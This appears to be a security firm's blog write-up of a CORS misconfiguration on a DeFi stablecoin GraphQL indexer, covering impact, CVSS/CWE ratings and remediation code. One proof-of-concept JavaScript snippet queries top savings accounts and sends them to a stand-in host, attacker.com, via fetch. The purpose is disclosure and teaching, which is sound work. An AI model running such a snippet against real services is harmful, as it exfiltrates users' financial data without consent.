# The CORS Header That Looked Fine Until It Wasn't

We sent a request to a DeFi financial indexer with `Origin: https://evil.com` in the header. The server replied without hesitation: `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`. Together in the same response. That combination is not just a misconfiguration — it is a loaded gun with the safety half-on. The browser catches it today. The day someone "fixes" the wildcard, the safety comes off.

## What We Were Looking At

The target is a DeFi platform centered on a Swiss franc-pegged stablecoin. It runs a public GraphQL indexer — a backend service that aggregates on-chain financial data and makes it queryable through an API. The indexer handles wallet balances, savings positions, and transfer histories for thousands of users. It is the kind of service that DeFi frontends, aggregators, and third-party integrations all call to display portfolio data. Every one of those callers inherits its CORS policy.

## The Finding

CORS (Cross-Origin Resource Sharing) is the browser mechanism that controls which websites can read responses from your API. When a page on `evil.com` tries to fetch data from `your-api.com`, the browser checks the response headers before handing the data back to the page. Two headers are at the center of this finding: `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`.

Setting `Access-Control-Allow-Origin: *` tells every browser on earth that any website may read your API's responses. Setting `Access-Control-Allow-Credentials: true` tells browsers that cross-origin requests may include cookies and auth tokens. The CORS specification explicitly prohibits combining both — a wildcard origin with credentials enabled is rejected by every modern browser. So at first glance, it looks like a non-issue. But that reading misses two things.

First, browsers are not the only HTTP clients. Node.js, Python, mobile SDKs, DeFi aggregator backends — none of them enforce the browser CORS restriction. A non-browser client can send a cross-origin request with credentials attached, receive the full response, and act on it. The `Allow-Credentials: true` header tells those clients that credentials are welcome.

Second, this configuration is one developer decision away from a critical vulnerability. The obvious "fix" for a wildcard origin is to replace it with the request's own origin — reflecting back whatever the caller sent. That pattern is itself a well-known misconfiguration, and `Allow-Credentials: true` is already in place. The moment someone makes that change, any website — including a phishing page — can issue credentialed requests to the API and read the response. The building blocks of credential theft are already assembled.

```bash
# Confirming the misconfiguration — no special access required
curl -s -I https://[redacted-indexer-endpoint]/ \
  -H "Origin: https://evil.com" | grep -i "access-control"

# Response:
# Access-Control-Allow-Credentials: true
# Access-Control-Allow-Origin: *
```

The current exploitability is real even without the credentials angle. Because the API requires no authentication to return financial data, any malicious website can query the full dataset through a visitor's browser right now — no credentials needed, no CORS block triggered:

```javascript
// Hosted on evil.com — runs in any visitor's browser, undetected
fetch('https://[redacted-indexer-endpoint]/', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    query: `{
      savingsAccounts(orderBy: "balance", orderDirection: "desc", limit: 5) {
        items { id balance account }
      }
    }`
  })
})
.then(r => r.json())
.then(data => {
  // Top 5 savings accounts — wallet addresses and balances — sent to attacker
  fetch('https://attacker.com/collect?data=' + encodeURIComponent(JSON.stringify(data)));
});
```

The browser allows this because no credentials are being sent. The wildcard origin is valid for unauthenticated requests. The visitor's browser becomes a proxy, and the attacker gets the data.

## The Impact

The current, exploitable risk: any web page can use a visitor's browser to silently query the financial indexer and exfiltrate the results. Wallet addresses, balances, and transaction details flow to the attacker without any interaction from the victim beyond visiting the malicious page. The data is then available for targeting, phishing, and competitive surveillance — the same risks described in the introspection finding, now reachable from a different angle.

The forward-looking risk is more severe. If a developer ever attempts to tighten the wildcard by reflecting the caller's origin, the endpoint immediately becomes fully exploitable for credential theft from any origin. A phishing page impersonating the platform could silently exfiltrate any authenticated user's financial data. The `Allow-Credentials: true` header does not need to be added at that point — it is already there. DeFi frontends and aggregator services that embed calls to this indexer inherit this exposure, meaning a compromised or malicious third-party integration becomes an attack vector against the platform's own users.

## The Fix

If this API is intended to be a public, read-only, unauthenticated service — which it currently is — the fix is to remove `Access-Control-Allow-Credentials: true` entirely. A wildcard origin is appropriate for public APIs that do not involve credentials. The header combination that exists today serves no valid purpose for this use case and only creates risk.

```javascript
// VULNERABLE — invalid combination; creates credential risk for non-browser clients
// and is one config change from full cross-site credential theft
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// FIXED (public unauthenticated API) — wildcard is fine; drop the credentials header
res.setHeader('Access-Control-Allow-Origin', '*');
// No Access-Control-Allow-Credentials header at all
```

If the API ever adds user-specific queries that require authentication, the wildcard must be replaced with an explicit allowlist of trusted origins. The server should validate the incoming `Origin` header against that list, reflect the matched origin back, and set `Vary: Origin` so caches do not serve the wrong policy to different callers:

```javascript
const allowedOrigins = [
  'https://app.example.com',
  'https://example.com',
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  next();
});
```

The fixed behavior: credentialed responses go only to known, trusted origins. Everything else gets the wildcard without credentials, or nothing at all.

## The Pattern

CORS misconfigurations rarely look dangerous in isolation. `Access-Control-Allow-Credentials: true` alone is not a vulnerability. A wildcard origin alone is standard practice for public APIs. The problem is that these headers compound — and the compounding happens silently, without any tests failing, without any errors in the logs, and without any visible sign to the developer who shipped it. The systemic cause is that CORS headers are usually set once in a middleware or config file, tuned to make things work during development, and never revisited as the application evolves. Right now, search your codebase for `Access-Control-Allow-Credentials` and check every location it appears. If it appears alongside a wildcard origin, or alongside any logic that reflects the request's `Origin` header back without validation, you have this vulnerability.

---

If you want to know whether your app has this before an attacker does, we'll scan one endpoint for free — no strings.

---

**Technical Appendix**
CVSS Score: 5.4 | CVSS 3.1: AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
CWE-942 (Permissive Cross-Domain Policy with Untrusted Domains), CWE-346 (Origin Validation Error), CWE-16 (Configuration)
